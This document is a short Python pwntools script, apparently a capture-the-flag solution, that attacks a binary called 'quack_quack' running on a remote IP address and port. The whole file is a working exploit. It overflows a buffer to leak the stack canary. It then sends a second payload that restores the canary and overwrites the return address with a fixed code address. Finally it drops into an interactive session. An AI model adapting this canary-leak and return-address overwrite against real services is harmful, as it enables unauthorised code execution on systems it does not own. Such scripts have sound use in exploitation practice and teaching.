from pwn import *

class QuackQuack:
    context.binary = './quack_quack'
    context.log_level = 'DEBUG'

    host = '94.237.59.38'
    port = 43117
    conn = remote(host, port)
    
    def send(self):
        try:
            payload = b'A' * 89 + b'Quack Quack '

            self.conn.sendlineafter(b'> ', payload)
            self.conn.recvuntil(b'Quack Quack ')
            
            canary = self.conn.recvuntil(b', ready to fight the Duck?', drop=True)
            canary_address = u64(b'\x00' + canary[:7])

            payload2 = b'A' * 88
            payload2 += p64(canary_address)
            payload2 += p64(0)
            payload2 += p64(0x40137f)
            
            self.conn.sendlineafter(b'> ', payload2)
            print(self.conn.recv().decode())
            self.conn.interactive()
        except: pass
        finally: self.conn.close()

if __name__ == '__main__':
    QuackQuack().send()
    